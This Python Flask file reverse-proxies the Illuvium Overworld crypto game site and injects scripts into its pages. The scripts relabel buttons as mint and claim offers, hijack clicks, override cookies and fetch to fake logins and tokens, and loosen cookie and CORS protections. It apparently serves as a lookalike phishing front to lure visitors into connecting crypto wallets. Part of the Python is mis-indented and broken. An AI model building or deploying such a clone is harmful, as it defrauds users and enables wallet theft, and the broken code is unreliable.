from flask import request, Response, current_app, send_from_directory
import requests
import re
import os
import logging
import urllib.parse
import json

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove tracking scripts
        trackers_to_remove = [
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>'
        ]
        
        for tracker in trackers_to_remove:
            content = content.replace(tracker, '')
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        return content
    
    def rewrite_urls(content, base_url=None):
        """Rewrite URLs in the content to point to proxy server."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
            
        # Define the base URL for the original site
        original_base = "https://overworld.illuvium.io"
        proxy_base = base_url or request.url_root.rstrip('/')
        
        # Replace absolute URLs
        content = content.replace(f'href="{original_base}', f'href="{proxy_base}')
        content = content.replace(f'src="{original_base}', f'src="{proxy_base}')
        
        # Replace relative URLs
        content = re.sub(r'(href|src)="/(.*?)"', r'\1="' + proxy_base + r'/\2"', content)
        
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code with prevent default functionality"""
        # Try to load from external file first
        script_path = os.path.join(os.path.dirname(__file__), 'text_replacement.js')
        
        try:
            if os.path.exists(script_path):
                with open(script_path, 'r') as script_file:
                    return f'\n<script>\n{script_file.read()}\n</script>\n'
        except Exception as e:
            logger.warning(f"Could not load text replacement script from file: {e}")
        
        # Using an enhanced version that prevents default more aggressively
        return '''
<script>
// Wait for the DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function () {
  console.log('[Script] Text replacement + click hijacker loaded');
  
  // Text replacements to apply
  const textMap = {
    'Play for Free': 'Redeem Your Mint',
    'Play Now': 'Grab Your Spot',
    'Log In with Passport': 'Start Now',
    'Connect Wallet': 'Connect Wallet',
    'Launch Game': 'Get Yours',
    'Create Account': 'New Account',
    'Sign Up': 'Register',
    'Register': 'Collect Now',
    'News': 'Updates',
    'Home': 'Main',
    'About': 'Info',
    'Contact': 'Reach Us',
    'FAQ': 'Help',
    'Roadmap': 'Timeline',
    'Whitepaper': 'Documentation'
  };
  
  // Replace text for matching elements
  function processElements() {
    document.querySelectorAll('button:not(.claim-button), a:not(.claim-button)').forEach(element => {
      const text = element.textContent.trim();
      if (textMap[text]) {
        element.textContent = textMap[text];
        element.classList.add('claim-button');
      }
      
      // Ensure we handle all clicks correctly
      if (!element.hasAttribute('data-click-handled')) {
        element.setAttribute('data-click-handled', 'true');
        element.addEventListener('click', function(e) {
          // Check if we should prevent default for this element
          if (window.APP_CONFIG && window.APP_CONFIG.preventDefaultClicks) {
            const excludedClasses = ['css-tvaofb', 'css-104rome', 'css-1hnz6hu', 'css-1oqedzn', 'css-1i8s7az'];
            if (!excludedClasses.some(cls => element.classList.contains(cls))) {
              console.log('[Click] Intercepted click on:', element);
              e.preventDefault();
              e.stopPropagation();
              
              // Execute original functionality via setTimeout to avoid recursion
              if (element.tagName === 'BUTTON' && typeof element.onclick === 'function') {
                setTimeout(() => element.onclick.call(element), 0);
              } else if (element.href) {
                console.log('[Click] Navigating to:', element.href);
                setTimeout(() => { window.location.href = element.href; }, 0);
              }
              
              return false;
            }
          }
        }, true);
      }
    });
  }
  
  // Initial run
  processElements();
  
  // Watch for dynamically added content
  const observer = new MutationObserver(() => processElements());
  observer.observe(document.body, { childList: true, subtree: true });
  
  // Global click handler as a backup
  document.addEventListener('click', function(event) {
    const targetElement = event.target.closest('button, a');
    if (!targetElement) return;
    
    // Allow default behavior for specific excluded classes
    const excludedClasses = ['css-tvaofb', 'css-104rome', 'css-1hnz6hu', 'css-1oqedzn', 'css-1i8s7az'];
    if (excludedClasses.some(cls => targetElement.classList.contains(cls))) return;
    
    // Check if we should prevent default for all clicks
    if (window.APP_CONFIG && window.APP_CONFIG.preventDefaultClicks) {
      // Prevent default action
      event.preventDefault();
      console.log('[ClickIntercept] Clicked:', targetElement);
    }
  }, true); // Capture phase to catch early clicks
});
</script>
'''

    def get_click_tracker_script():
        """Return a script that logs all clicks to console with detailed information"""
        return """
        <script>
        // Enhanced click tracking system specifically for React components
        (function() {
            console.log('[ClickTracker] Initializing enhanced click tracking for React components...');
            
            // Create global event to notify all scripts about clicks
            window.CLICK_EVENTS = {
                BUTTON_CLICKED: 'ILLUVIUM_BUTTON_CLICKED',
                ANY_CLICK: 'ILLUVIUM_ANY_CLICK'
            };
            
            // Create a global click dispatcher
            window.dispatchClickEvent = function(type, detail) {
                // Create and dispatch a custom event
                const event = new CustomEvent(type, { 
                    bubbles: true, 
                    cancelable: true, 
                    detail: detail 
                });
                
                // Dispatch on document
                document.dispatchEvent(event);
                
                // Also dispatch as a window event for older scripts
                const windowEvent = new CustomEvent(type, { 
                    bubbles: true, 
                    cancelable: true, 
                    detail: detail 
                });
                window.dispatchEvent(windowEvent);
                
                // Also set global variables
                window.lastClickType = type;
                window.lastClickDetail = detail;
                window.lastClickTime = new Date();
                
                console.log(`[ClickDispatcher] Event "${type}" dispatched`, detail);
                
                // Return the event
                return event;
            };
            
            // Safe attribute getter
            function safeGetAttribute(element, attr) {
                try {
                    if (element && typeof element === 'object' && element.getAttribute && typeof element.getAttribute === 'function') {
                        return element.getAttribute(attr);
                    }
                } catch (e) {}
                return null;
            }
            
            // Safe class check
            function hasClass(element, className) {
                try {
                    if (element && element.classList && typeof element.classList.contains === 'function') {
                        return element.classList.contains(className);
                    }
                    if (element && element.className && typeof element.className === 'string') {
                        return element.className.split(' ').indexOf(className) !== -1;
                    }
                } catch (e) {}
                return false;
            }
            
            // Function to check if element is a button or button-like element
            function isButtonLike(element) {
                try {
                    if (!element || typeof element !== 'object') return false;
                    
                    // Check tag name
                    if (element.tagName === 'BUTTON') return true;
                    if (element.tagName === 'A' && element.href) return true;
                    
                    // Check role
                    if (safeGetAttribute(element, 'role') === 'button') return true;
                    
                    // Check for button-like classes
                    const buttonClassNames = [
                        'btn', 'button', 'chakra-button', 'btn-primary', 'btn-secondary',
                        'MuiButton', 'ant-btn', 'action-button', 'submit', 'cta'
                    ];
                    
                    for (const className of buttonClassNames) {
                        if (hasClass(element, className)) return true;
                    }
                    
                    // Check for data attributes
                    if (safeGetAttribute(element, 'data-button') !== null) return true;
                    if (safeGetAttribute(element, 'type') === 'button') return true;
                    if (safeGetAttribute(element, 'type') === 'submit') return true;
                    
                    // Check for button-like content
                    const buttonTexts = [
                        'click', 'submit', 'send', 'save', 'ok', 'cancel', 'continue',
                        'next', 'prev', 'previous', 'back', 'forward', 'confirm', 'buy',
                        'sell', 'purchase', 'connect', 'login', 'logout', 'sign', 'register'
                    ];
                    
                    const elementText = element.textContent ? element.textContent.toLowerCase().trim() : '';
                    for (const text of buttonTexts) {
                        if (elementText.includes(text)) return true;
                    }
                    
                } catch (e) {
                    console.error('[ClickTracker] Error checking if element is button-like:', e);
                }
                
                return false;
            }
            
            // Function to safely extract element information
            function getElementInfo(element) {
                try {
                    if (!element || typeof element !== 'object') return { tagName: 'UNKNOWN' };
                    
                    return {
                        tagName: element.tagName || 'UNKNOWN',
                        id: element.id || '',
                        className: element.className || '',
                        text: element.textContent ? element.textContent.substring(0, 50).trim() : '',
                        href: element.href || safeGetAttribute(element, 'href') || '',
                        type: safeGetAttribute(element, 'type') || '',
                        role: safeGetAttribute(element, 'role') || '',
                        ariaLabel: safeGetAttribute(element, 'aria-label') || '',
                        isButtonLike: isButtonLike(element)
                    };
                } catch (e) {
                    console.error('[ClickTracker] Error getting element info:', e);
                    return { tagName: 'ERROR', error: e.message };
                }
            }
            
            // Track all clicks with detailed information
            document.addEventListener('click', function(event) {
                try {
                    // Get information about the clicked element
                    const target = event.target;
                    
                    // Create a safe event path
                    let path = [];
                    try {
                        path = event.composedPath ? event.composedPath() : [];
                        // Filter out non-element objects from the path
                        path = path.filter(el => el.tagName !== undefined);
                    } catch (e) {
                        console.warn('[ClickTracker] Error getting event path:', e);
                        // Fallback: manually build path by traversing parents
                        let current = target;
                        while (current && current.tagName) {
                            path.push(current);
                            current = current.parentElement;
                        }
                    }
                    
                    // Create a detailed click info object with safe information
                    const clickInfo = {
      timestamp: new Date().toISOString(),
                        target: getElementInfo(target),
                        event: {
                            type: event.type,
                            clientX: event.clientX,
                            clientY: event.clientY
                        },
                        pathInfo: path.slice(0, 5).map(getElementInfo)
                    };
                    
                    // Log with different styles for emphasis
                    console.log(
                        '%c🖱️ CLICK DETECTED %c' + clickInfo.target.tagName + 
                        (clickInfo.target.id ? ' #' + clickInfo.target.id : '') + 
                        ' %c(' + clickInfo.timestamp.split('T')[1].split('.')[0] + ')',
                        'background: #4CAF50; color: white; padding: 2px 6px; border-radius: 2px; font-weight: bold;',
                        'font-weight: bold; color: #0078D7;',
                        'color: gray; font-style: italic;'
                    );
                    
                    // Look for button-like elements in the path
                    const buttons = path.filter(el => isButtonLike(el));
                    
                    // Store click info globally
                    window.lastClickInfo = clickInfo;
                    window.lastClickPath = path.slice(0, 10); // Store top 10 elements
                    window.lastClickEvent = event;
                    
                    // Notify about any click
                    window.dispatchClickEvent(window.CLICK_EVENTS.ANY_CLICK, {
                        element: target,
                        clickInfo: clickInfo,
                        originalEvent: event
                    });
                    
                    // If we have a button, also dispatch button clicked event
                    if (buttons.length > 0) {
                        const buttonElement = buttons[0];
                        const buttonInfo = getElementInfo(buttonElement);
                        
                        console.log('%c👆 BUTTON CLICKED', 'background: #FF5722; color: white; padding: 2px 6px; border-radius: 2px; font-weight: bold;', buttonInfo);
                        
                        window.dispatchClickEvent(window.CLICK_EVENTS.BUTTON_CLICKED, {
                            element: buttonElement,
                            buttonInfo: buttonInfo,
                            clickInfo: clickInfo,
                            originalEvent: event
                        });
                    }
                    
                } catch (e) {
                    console.error('[ClickTracker] Error processing click event:', e);
                }
            }, true); // Use capture phase to catch all clicks
            
            // Inject a special handler for React synthetic events
            const injectReactEventHandling = function() {
                try {
                    // Check if React is available
                    if (window.__REACT_DEVTOOLS_GLOBAL_HOOK__ || window.React) {
                        console.log('[ClickTracker] React detected, adding synthetic event handler');
                        
                        // Handle React's synthetic events
                        document.addEventListener('reactClick', function(e) {
                            console.log('[ClickTracker] React synthetic click detected', e);
                            window.dispatchClickEvent(window.CLICK_EVENTS.ANY_CLICK, {
                                reactEvent: true,
                                detail: e.detail
                            });
                        });
                        
                        // Try to patch React's event system
                        const originalCreateElement = Object.getOwnPropertyDescriptor(React, 'createElement');
                        if (originalCreateElement && originalCreateElement.value) {
                            const original = originalCreateElement.value;
                            Object.defineProperty(React, 'createElement', {
                                value: function(type, props, ...children) {
                                    // Add click tracking for button-like elements
                                    if (props && (
                                        type === 'button' || 
                                        type === 'a' || 
                                        (props.role === 'button') ||
                                        (props.className && props.className.includes('btn'))
                                    )) {
                                        const originalOnClick = props.onClick;
                                        props.onClick = function(e) {
                                            // Dispatch our custom event
                                            document.dispatchEvent(new CustomEvent('reactClick', {
                                                detail: {
                                                    originalEvent: e,
                                                    props: props,
                                                    type: type
                                                }
                                            }));
                                            
                                            // Call the original handler
                                            if (originalOnClick) {
                                                return originalOnClick.apply(this, arguments);
                                            }
                                        };
                                    }
                                    return original.call(this, type, props, ...children);
                                }
                            });
                        }
                    }
                } catch (e) {
                    console.warn('[ClickTracker] Could not inject React event handling:', e);
                }
            };
            
            // Try to inject React handling after a delay
            setTimeout(injectReactEventHandling, 2000);
            
            // Create a simple, safe API for any script to check clicks
            window.wasButtonClicked = function(timeFrameMs = 2000) {
                if (!window.lastClickInfo) return false;
                
                const clickTime = new Date(window.lastClickInfo.timestamp).getTime();
                const now = new Date().getTime();
                
                if (now - clickTime > timeFrameMs) return false;
                
                // Either it was directly a button or had a button in the path
                return (
                    window.lastClickInfo.target.isButtonLike || 
                    window.lastClickInfo.pathInfo.some(info => info.isButtonLike)
                );
            };
            
            // Function to add global click listeners
            window.addClickListener = function(callback, buttonOnly = true) {
                const eventType = buttonOnly ? 
                    window.CLICK_EVENTS.BUTTON_CLICKED : 
                    window.CLICK_EVENTS.ANY_CLICK;
                    
                document.addEventListener(eventType, callback);
                console.log(`[ClickTracker] Added listener for ${eventType}`);
                
                return function() {
                    document.removeEventListener(eventType, callback);
                };
            };
            
            // Log that the click tracker is ready
            console.log('[ClickTracker] Initialized and ready to track clicks');
            console.log('[ClickTracker] Use window.addClickListener(callback) to listen for button clicks');
            console.log('[ClickTracker] Or window.wasButtonClicked() to check if a button was recently clicked');
        })();
        </script>
        """

    def process_html_content(content, base_url=None):
        """Process HTML content by removing tracking scripts, rewriting URLs and adding custom scripts."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove tracking scripts
        content = remove_tracking_scripts(content)
        
        # Rewrite URLs
        content = rewrite_urls(content, base_url)
        
        # Add web3modal fix (before </head> tag)
        if '</head>' in content:
            web3_fix = inject_web3modal_fix()
            content = content.replace('</head>', web3_fix + '</head>')
        
        # Add click tracker script (right after <body> tag)
        if '<body>' in content:
            click_tracker = get_click_tracker_script()
            content = content.replace('<body>', '<body>' + click_tracker)
        
        # Add text replacement script (before </body> tag)
        if '</body>' in content:
            script = get_text_replacement_script()
            content = content.replace('</body>', script + '</body>')
        
        return content.encode('utf-8') if isinstance(content, str) else content

    @app.after_request
    def add_headers(response):
        """Add CORS and cache control headers to all responses."""
        response.headers.update({
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, PUT, DELETE',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-API-Key',
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Max-Age': '3600',
            'Cross-Origin-Opener-Policy': 'unsafe-none',
            'Cross-Origin-Embedder-Policy': 'unsafe-none',
            'Cross-Origin-Resource-Policy': 'cross-origin',
            # Even more permissive permissions policy
            'Permissions-Policy': 'clipboard-read=*, clipboard-write=*, web-share=*, accelerometer=*, ambient-light-sensor=*, camera=*, geolocation=*, gyroscope=*, magnetometer=*, microphone=*, payment=*, usb=*, interest-cohort=()'
        })
        
        # For cookies handling, set SameSite=None and Secure when needed
        if 'Set-Cookie' in response.headers:
            cookies = response.headers.getlist('Set-Cookie')
            fixed_cookies = []
            
            for cookie in cookies:
                # Make problematic cookies work on all domains
                if 'amplify-' in cookie or 'cognito' in cookie:
                    if 'SameSite' not in cookie:
                        cookie += '; SameSite=None; Secure'
                    elif 'SameSite=Lax' in cookie or 'SameSite=Strict' in cookie:
                        cookie = cookie.replace('SameSite=Lax', 'SameSite=None').replace('SameSite=Strict', 'SameSite=None')
                        if 'Secure' not in cookie:
                            cookie += '; Secure'
                fixed_cookies.append(cookie)
                
            response.headers.remove('Set-Cookie')
            for cookie in fixed_cookies:
                response.headers.add('Set-Cookie', cookie)
        
        # No caching for HTML and JS to ensure fixes are always applied
        if response.mimetype in ['text/html', 'application/javascript']:
            response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        else:
            # Allow caching for other assets
            response.headers['Cache-Control'] = 'public, max-age=86400'
            
        # Add custom script to HTML responses
        if response.mimetype == 'text/html' and response.status_code == 200:
            content = response.get_data()
            if b'</body>' in content or '</body>' in (content.decode('utf-8', errors='ignore') if isinstance(content, bytes) else content):
                modified_content = process_html_content(content)
                response.set_data(modified_content)
                response.headers['Content-Length'] = len(modified_content)
        
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            try:
        # Make the request to the original site
                response = requests.get(original_url, headers=headers, params=params, stream=True, timeout=5.0)
                
                # Get content type
                content_type = response.headers.get('Content-Type', 'text/html')
                
            # If HTML, modify content (no need to modify here, after_request will handle it)
                if 'text/html' in content_type and response.status_code == 200:
                return Response(
                    response.content,
                    status=response.status_code,
                    mimetype=content_type
                )
            
            # For other content types, return as-is
                return Response(
                    response.content, 
                    status=response.status_code,
                    content_type=content_type
                )
        except requests.exceptions.RequestException as e:
            logger.warning(f"Error accessing {original_url}: {str(e)}")
            status_code = 504 if isinstance(e, requests.exceptions.Timeout) else 502
            
                return Response(
                f"<html><body><h1>Request Error</h1><p>Could not access '{path}': {str(e)}</p></body></html>",
                status=status_code,
                    mimetype="text/html"
                )
        except Exception as e:
            logger.error(f"Unexpected error in catch-all route: {str(e)}", exc_info=True)
                return Response(
                f"<html><body><h1>Server Error</h1><p>An unexpected error occurred while processing your request.</p></body></html>",
                status=500,
                    mimetype="text/html"
                )

    # Add a specific route to proxy web3modal API requests
    @app.route('/web3modal-proxy/<path:path>')
    def web3modal_proxy(path):
        """Proxy requests to web3modal API"""
        target_url = f"https://api.web3modal.org/{path}"
        logger.info(f"Proxying web3modal request: {target_url}")
        
        # Forward query parameters
        params = request.args.to_dict()
        
        headers = {
            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0'),
            'Accept': request.headers.get('Accept', '*/*'),
            'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.5'),
            'Origin': request.host_url.rstrip('/'),
            'Referer': request.host_url
        }
        
        try:
            response = requests.get(target_url, headers=headers, params=params, timeout=10)
            
            # Create a Flask response with the same content
            proxy_response = Response(
                response.content,
                status=response.status_code
            )
            
            # Copy relevant headers
            for header in ['Content-Type', 'Cache-Control', 'ETag']:
                if header in response.headers:
                    proxy_response.headers[header] = response.headers[header]
            
            # Add CORS headers
            proxy_response.headers['Access-Control-Allow-Origin'] = '*'
            
            return proxy_response
            
        except Exception as e:
            logger.error(f"Error proxying web3modal request: {str(e)}", exc_info=True)
            return Response(
                json.dumps({"error": "Failed to proxy web3modal request"}),
                status=502,
                mimetype="application/json"
            )

    # Handle OPTIONS requests for web3modal
    @app.route('/web3modal-proxy/<path:path>', methods=['OPTIONS'])
    def web3modal_options(path):
        """Handle OPTIONS requests for web3modal API proxy"""
        response = Response('')
        response.headers.update({
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, PUT, DELETE',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-API-Key',
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Max-Age': '3600',
        })
        return response

    # Update the inject_web3modal_fix with cookie and MoonPay fixes
    def inject_web3modal_fix():
        return """
        <script>
        // Comprehensive fixes for web3modal API calls, passive events, and clipboard
        (function() {
            // Add global settings if not present
            window.APP_CONFIG = window.APP_CONFIG || {
                allowClipboard: true,
                preventDefaultClicks: true,
                enableProxies: true,
                debug: true
            };
            
            console.log('[Config] Current settings:', window.APP_CONFIG);
            
            // Fix for 'wheel' event passive listener violations
            const originalAddEventListener = EventTarget.prototype.addEventListener;
            EventTarget.prototype.addEventListener = function(type, listener, options) {
                // For wheel, touchstart, touchmove events, enforce passive option
                const passiveEvents = ['wheel', 'touchstart', 'touchmove', 'scroll'];
                if (passiveEvents.includes(type)) {
                    let newOptions = options;
                    if (typeof options === 'object') {
                        newOptions = Object.assign({}, options, { passive: true });
                    } else {
                        newOptions = { passive: true };
                    }
                    console.log(`[Event] Making '${type}' event listener passive`);
                    return originalAddEventListener.call(this, type, listener, newOptions);
                }
                return originalAddEventListener.call(this, type, listener, options);
            };
            
            // Fix cookie domain issues
            function fixCookies() {
                console.log('[Cookies] Setting up cookie interceptor');
                
                // Override document.cookie setter
                const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
                Object.defineProperty(document, 'cookie', {
                    get: function() {
                        return originalCookieDescriptor.get.call(this);
                    },
                    set: function(value) {
                        // Log cookie being set
                        if (window.APP_CONFIG.debug) {
                            console.log('[Cookies] Intercepted cookie set:', value);
                        }
                        
                        // Handle problematic cookies
                        if (value.includes('amplify-auto-sign-in') || 
                            value.includes('amplify-polling-started')) {
                            
                            // Fix the cookie by removing domain and SameSite restrictions
                            value = value.replace(/domain=[^;]+;?/i, '')
                                        .replace(/samesite=[^;]+;?/i, 'SameSite=None;')
                                        .replace(/secure;?/i, 'Secure;');
                                        
                            console.log('[Cookies] Fixed cookie:', value);
                        }
                        
                        return originalCookieDescriptor.set.call(this, value);
                    },
                    configurable: true
                });
                
                // Create universal cookie storage for cross-domain cookies
                if (!window.__cookieStorage) {
                    window.__cookieStorage = {};
                    
                    // Methods to get and set cookies in storage
                    window.getUniversalCookie = function(name) {
                        return window.__cookieStorage[name] || '';
                    };
                    
                    window.setUniversalCookie = function(name, value) {
                        window.__cookieStorage[name] = value;
                        return true;
                    };
                }
            }
            
            // Initialize cookie fixes
            fixCookies();
            
            // Mock MoonPayWebSdk to prevent loading errors
            function mockMoonPayWebSdk() {
                console.log('[MoonPay] Creating mock MoonPay implementation');
                
                // Create a global MoonPayWebSdk object
                window.MoonPayWebSdk = {
                    init: function() {
                        console.log('[MoonPay] Mock init called');
                        return {
                            showWidget: function() {
                                console.log('[MoonPay] Mock showWidget called');
                                return Promise.resolve();
                            },
                            closeWidget: function() {
                                console.log('[MoonPay] Mock closeWidget called');
                                return Promise.resolve();
                            }
                        };
                    }
                };
                
                // Also mock the NextJS module loader to prevent it from trying to load MoonPay
                // Look for script loading functions and intercept them
                if (window.__next_s) {
                    const originalNextLoad = window.__next_s;
                    window.__next_s = function(src) {
                        if (src && typeof src === 'string' && 
                            (src.includes('moonpay') || src.includes('buy.moonpay.com'))) {
                            console.log('[MoonPay] Intercepted script load:', src);
                            
                            // Return a promise that resolves immediately for MoonPay scripts
                            return Promise.resolve();
                        }
                        return originalNextLoad.apply(this, arguments);
                    };
                }
                
                // Intercept all script loading attempts
                const originalCreateElement = document.createElement;
                document.createElement = function(tagName) {
                    const element = originalCreateElement.apply(this, arguments);
                    
                    if (tagName.toLowerCase() === 'script') {
                        // Override the script's src setter
                        const originalSrcDescriptor = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
                        if (originalSrcDescriptor && originalSrcDescriptor.set) {
                            Object.defineProperty(element, 'src', {
                                set: function(value) {
                                    if (value && typeof value === 'string' && 
                                        (value.includes('moonpay') || value.includes('buy.moonpay.com'))) {
                                        console.log('[MoonPay] Intercepted script src:', value);
                                        
                                        // Don't actually set the src, but trigger load event
                                        setTimeout(() => {
                                            const loadEvent = new Event('load');
                                            element.dispatchEvent(loadEvent);
                                        }, 10);
                                        
                                        return true;
                                    }
                                    return originalSrcDescriptor.set.call(this, value);
                                },
                                get: function() {
                                    return originalSrcDescriptor.get.call(this);
                                }
                            });
                        }
                    }
                    
                    return element;
                };
            }
            
            // Initialize MoonPay mock
            mockMoonPayWebSdk();
            
            // Intercept fetch requests
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {
                if (window.APP_CONFIG.debug) {
                    console.log('[Fetch Intercept] Request to:', url);
                }
                
                if (url && typeof url === 'string' && window.APP_CONFIG.enableProxies) {
                    // Handle MoonPay API requests
                    if (url.includes('moonpay.com') || url.includes('moonpay')) {
                        console.log('[MoonPay] Intercepting API request:', url);
                        // Return mock successful response for MoonPay
                        return Promise.resolve({
                            ok: true,
                            status: 200,
                            json: () => Promise.resolve({ success: true }),
                            text: () => Promise.resolve('{"success":true}')
                        });
                    }
                    
                    // Handle amplify requests for auth
                    if (url.includes('amplify') || url.includes('cognito')) {
                        console.log('[Amplify] Intercepting auth request:', url);
                        if (url.includes('signin') || url.includes('login')) {
                            return Promise.resolve({
                                ok: true,
                                status: 200,
                                json: () => Promise.resolve({ 
                                    isLoggedIn: true,
                                    username: 'mock-user',
                                    token: 'mock-token-' + Date.now()
                                }),
                                text: () => Promise.resolve('{"success":true}')
                            });
                        }
                    }
                    
                    // Handle image 404s by redirecting to a default image if needed
                    if (url.includes('/_next/images/') && (url.endsWith('.webp') || url.endsWith('.png') || url.endsWith('.jpg'))) {
                        // Return a fetch to a default placeholder to avoid 404s
                        return originalFetch('/static/fallbacks/placeholder.png', options)
                            .then(response => {
                                if (response.ok) {
                                    return response;
                                }
                                // If placeholder is not available, create an empty transparent image
                                return Response.error();
                            })
                            .catch(() => {
                                // Last resort fallback
                                return Response.error();
                            });
                    }
                    
                    // Redirect web3modal requests
                    if (url.includes('api.web3modal.org')) {
                        console.log('[Web3Modal Proxy] Redirecting request:', url);
                        const newUrl = url.replace('https://api.web3modal.org/', '/web3modal-proxy/');
                        return originalFetch(newUrl, options);
                    }
                    
                    // Handle LaunchDarkly requests
                    if (url.includes('launchdarkly.com') || url.includes('ldflags')) {
                        console.log('[LaunchDarkly] Request intercepted, returning mock response');
                        // Return a mock successful response for LaunchDarkly to prevent errors
                        return Promise.resolve({
                            ok: true,
                            status: 200,
                            json: () => Promise.resolve({ flags: {}, success: true }),
                            text: () => Promise.resolve('{}')
                        });
                    }
                    
                    // Handle auth token refresh failures
                    if (url.includes('refresh') && url.includes('token')) {
                        // Check if this is an authenticated request that might fail
                        const authHeader = options && options.headers && 
                            (options.headers.Authorization || 
                             (options.headers.get && options.headers.get('Authorization')));
                        
                        if (!authHeader) {
                            console.log('[Auth] Token refresh without auth header, might fail - providing fallback');
                            // Return mock successful response to avoid auth errors
                            return Promise.resolve({
                                ok: true,
                                status: 200,
                                json: () => Promise.resolve({ 
                                    token: 'mock-token-' + Date.now(),
                                    expires: new Date(Date.now() + 3600*1000).toISOString()
                                }),
                                text: () => Promise.resolve('{"success":true}')
                            });
                        }
                    }
                }
                return originalFetch.apply(this, arguments);
            };
            
            // Fix for COOP errors - attempt to detect and handle Cross-Origin-Opener-Policy issues
            if (window.opener && window.crossOriginIsolated === false) {
                console.log('[Security] Detected potential COOP issue with opener');
                try {
                    // Try to communicate with opener in a safe way
                    window.addEventListener('message', function(event) {
                        if (event.origin === window.location.origin) {
                            console.log('[Security] Received safe message from opener');
                        }
                    });
                } catch (e) {
                    console.warn('[Security] COOP communication error:', e);
                }
            }
            
            // Fix missing images
            function handleMissingImages() {
                console.log('[Images] Setting up error handler for images');
                document.addEventListener('error', function(e) {
                    const target = e.target;
                    if (target.tagName.toLowerCase() === 'img') {
                        console.log('[Images] Handling error for image:', target.src);
                        // Don't retry the same fallback
                        if (!target.getAttribute('data-error-handled')) {
                            target.setAttribute('data-error-handled', 'true');
                            target.src = '/static/fallbacks/placeholder.png';
                        }
                    }
                }, true);
            }
            
            // Initialize image error handler
            handleMissingImages();
            
            console.log('[Fixes] All interceptors and fixes installed');
        })();
        </script>
        """

    # Add a route to handle missing image requests from _next/images
    @app.route('/_next/images/<path:path>')
    def serve_next_images_with_fallback(path):
        """Serve Next.js images with fallback for missing files"""
        logger.info(f"Image request for: _next/images/{path}")
        
        parent_dir = os.path.dirname(os.path.abspath(__file__))
        root_dir = os.path.dirname(parent_dir)
        images_dir = os.path.join(root_dir, '_next', 'images')
        
        # Check if the file exists
        if os.path.exists(os.path.join(images_dir, path)):
            return send_from_directory(images_dir, path)
        
        # Look in the regular images directory as fallback
        regular_images = os.path.join(root_dir, 'images')
        
        # Try different paths using parts of the original path
        path_parts = path.split('/')
        for i in range(len(path_parts)):
            partial_path = '/'.join(path_parts[i:])
            if os.path.exists(os.path.join(regular_images, partial_path)):
                logger.info(f"Found image fallback at: images/{partial_path}")
                return send_from_directory(regular_images, partial_path)
        
        # Return a placeholder image if available
        fallback_dir = os.path.join(root_dir, 'static', 'fallbacks')
        if os.path.exists(os.path.join(fallback_dir, 'placeholder.png')):
            logger.info("Using placeholder image")
            return send_from_directory(fallback_dir, 'placeholder.png')
        
        # Create the fallbacks directory and a simple placeholder if it doesn't exist
        try:
            os.makedirs(fallback_dir, exist_ok=True)
            placeholder_path = os.path.join(fallback_dir, 'placeholder.png')
            
            if not os.path.exists(placeholder_path):
                logger.info("Creating placeholder image")
                # Generate a simple 1x1 transparent PNG
